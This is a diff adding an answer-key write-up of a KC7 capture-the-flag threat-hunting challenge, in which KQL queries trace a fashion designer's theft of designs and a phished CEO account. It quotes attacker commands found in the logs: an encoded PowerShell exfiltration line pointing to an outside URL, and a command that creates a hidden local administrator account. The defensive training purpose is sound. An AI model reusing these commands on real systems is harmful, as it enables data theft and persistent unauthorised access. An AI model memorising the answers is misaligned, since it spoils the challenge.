@@ -1,0 +1,180 @@
+SUMMARY
+Celestial Cowboy Couture has spent months planning and pouring money into launching their most anticipated collection. They even hired a superstar fashion CEO to take them to the next level and stand alongside the big French and Italian brands. Everything was set for the big launch, but just as they were ready to unveil the collection, an employee noticed something disturbing: some of their designs had already been knocked off and were available on OutlawBuy.com! 
+
+SOURCE
+https://kc7cyber.com/challenges/298
+
+Section 1: What's a Query?
+What is the name of the Director of Happiness?
+Employees
+| where role == "Director of Happiness"
+Answer: Jason Blanchard
+Notes: IP - 10.10.0.41, email - jason_blanchard@celestialcowboycouture.com, username - jablanchard, hostname - WHTI-MACHINE, MFA enabled - True
+
+What is Mary Ellen Kennel's role?
+Employees
+| where name == "Mary Ellen Kennel"
+Answer: Designer
+Notes: IP - 10.10.0.31, email - mary_ellen_kennel@celestialcowboycouture.com, username - maellen, hostname - EYMG-LAPTOP, MFA enabled - False
+
+What is our model's exact role?
+Employees
+| where role contains "model"
+Answer: Underwear Model
+Notes: name - John Strand, IP - 10.10.0.3, email - john_strand@celestialcowboycouture.com, username - jostrand, hostname - PFW2-DESKTOP, MFA enabled - True
+
+What is John Strand's IP Address?
+Answer: 10.10.0.3
+
+What is John Strand's hostname?
+Answer: PFW2-DESKTOP
+
+What is John Strand's email address?
+Answer: john_strand@celestialcowboycouture.com
+
+How many emails did John Strand receive?
+Email
+|where recipient == "john_strand@celestialcowboycouture.com"
+| count
+Answer: 25
+
+How many distinct commands were run on John Strand's machine?
+ProcessEvents
+| where hostname == "PFW2-DESKTOP"
+| distinct process_commandline
+Answer: 148
+
+
+Section 2: All About the Dataz
+Which table would tell us if John Strand received a suspicious email?
+Answer: Email
+
+Which table would tell us if he went to his bank website to see how much money he had?
+Answer: OutboundNetworkEvemts
+
+Which table would tell us if John Strand saved a malicious file on his computer?
+Answer: FileCreationEvents
+
+Which table would tell us if John Strand opened that malicious file that was saved on his computer?
+Answer: ProcessEvents
+
+Which table would you look in to see if that malicious file was detected on John Strand's machine?
+Answer: SecurityAlerts
+
+
+Section 3: Cyber Cattle Thief
+What is the name of the Lead Fashion Designer?
+Employees
+| where role == "Lead Fashion Designer"
+Answer: Megan Lucia
+Notes: IP - 10.10.0.14, email - megan_lucia@celestialcowboycouture.com, username - melucia, hostname - ITCK-MACHINE, MFA enabled - False
+
+Does it look like Megan was up to suspicious activity that needs to be investigated further?
+FileCreationEvents
+| where hostname == "ITCK-MACHINE"
+| order by timestamp desc
+Answer: yes
+
+How many of these zip files were created on Megan's machine?
+FileCreationEvents
+| where hostname == "ITCK-MACHINE"
+| where filename has_any (".zip",".7z")
+Answer: 4
+
+What folder were the zip files placed in on Megan's machine?
+Answer: designs_to_steal
+
+An executable file, advanced-uploader.exe, appears on Megan’s machine after the creation of the zip files. Executable files, or .exe files, are programs that can run on a computer. This could be a tool used to move data out of the network. What is the timestamp for when this file was created?
+FileCreationEvents
+| where hostname == "ITCK-MACHINE"
+| where filename contains "advanced-uploader.exe"
+Answer: 10/2/2024, 8:36:47 AM
+
+Was this process executed on Megan's machine?(Yes/No)
+ProcessEvents
+| where hostname == "ITCK-MACHINE"
+| where process_name == "advanced-uploader.exe"
+Answer: yes
+
+What is the full URL where the files were exfiltrated to?
+Given this command line: C:\Windows\System32\powershell.exe -Nop -ExecutionPolicy bypass -Command "$enc = 'QzpcV2luZG93c1xTeXN0ZW0zMlxwb3dlcnNoZWxsLmV4ZSAtTm9wIC1FeGVjdXRpb25Qb2xpY3kgYnlwYXNzIC1Db21tYW5kICIkcmV2ID0gJzMgeXJ0ZXItLSBCTTUgZXppcy1rbnVoYy0tIHRweXJjbmUtLSBuaWhzdXB0aXRlZWthbnRyYXBlcmVodGFrb29sb3RuaWh0b250bmlhL21vYy55cnJlYmVsa2N1aC1ydW95LW1pLy86cHR0aCB0c2VkLS0gcGl6LnRvb2xfZGVvc3NhbFxjaWxidVBcc3Jlc1VcOkMgZWxpZi0tIGV4ZS5yZWRhb2xwdS1kZWNuYXZkYSc7JHJldls6Oi0xXSI=';[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))"
+Decodes to: http://im-your-huckleberry.com/aintnothintolookatherepartnakeetitpushin
+
+What database table contains evidence of employee logins?
+Answer: AuthenticationEvents
+
+In Megan’s login history, one of these logins stands out from the others! It contains a different source IP and user-agent. This is called an anomaly and could be the key to uncovering more about the attack. Paste the timestamp for when that anomalous login occurred.
+AuthenticationEvents
+| where username == "melucia"
+|where result == "Successful Login"
+Answer: 9/23/2024, 6:58:54 AM
+
+What is the source IP used for that login?
+Answer: 192.124.249.15
+
+
+Section 4: Cowhands-on-Keyboard
+How many succesful logins were made from that IP?
+AuthenticationEvents
+| where src_ip == "192.124.249.15" and result == "Successful Login"
+| count
+Answer: 2
+
+What is the username for the other employee that this IP was used to log into?
+AuthenticationEvents
+| where src_ip == "192.124.249.15" and result == "Successful Login"
+Answer: jahartley
+
+You've discovered a second employee who is possibly compromised! Let's dig deeper into who this employee is. What is this employee's role?
+Employees
+| where username == "jahartley"
+Answer: CEO
+Notes: name - Jane Hartley, IP - 10.10.0.30, email - jane_hartley@celestialcowboycouture.com, hostname - JHTJ-DESKTOP, MFA enabled - False
+
+Enter the timestamp for when the attacker established persisitence.
+ProcessEvents
+|where hostname == "JHTJ-DESKTOP"
+| where timestamp between 
+        (datetime(2024-09-19T06:25:59Z) .. datetime(2024-09-20T15:25:27Z))
+View this line: net user backdooradmin CowboyBandits123! /add && 
+net localgroup administrators backdooradmin /add && echo "User 'backdooradmin' added to Administrators group."
+Answer: 9/20/2024, 4:39:09 AM
+
+How many domains does the 192.124.249.15 IP resolve to?
+PassiveDns
+| where ip == "192.124.249.15"
+Answer: 2
+
+What newly uncovered IP resolves to the secure-celestial.com domain?
+ PassiveDns
+ | where domain in ("secure-celestial.com",
+   "celestialcowboy-support.com")
+   | distinct ip
+Answer: 142.250.191.78
+
+What is the name of the next domain that you've uncovered?
+let all_ips = PassiveDns
+|where domain in ("secure-celestial.com", 
+    "celestialcowboy-support.com")
+|distinct ip;
+PassiveDns
+| where ip in (all_ips)
+|distinct domain
+Answer: cccouture-hr-update.com
+
+Is there any evidence of network traffic to any of those domains? (Yes/No)
+OutboundNetworkEvents
+| where url has_any ("cccouture-hr-update.com", 
+ "celestialcowboy-support.com",
+ "secure-celestial.com")
+Answer: yes
+
+What is the subject of the email sent to Megan Lucia?
+ Email
+ | where link has_any ("cccouture-hr-update.com", 
+ "celestialcowboy-support.com",
+ "secure-celestial.com")
+Answer: URGENT: From your CEO - Immediate Action Required: You are getting promoted Cowboy!!!!
+
+Which Backdoors & Breaches initial compromise card was played here?
+Answer: phish
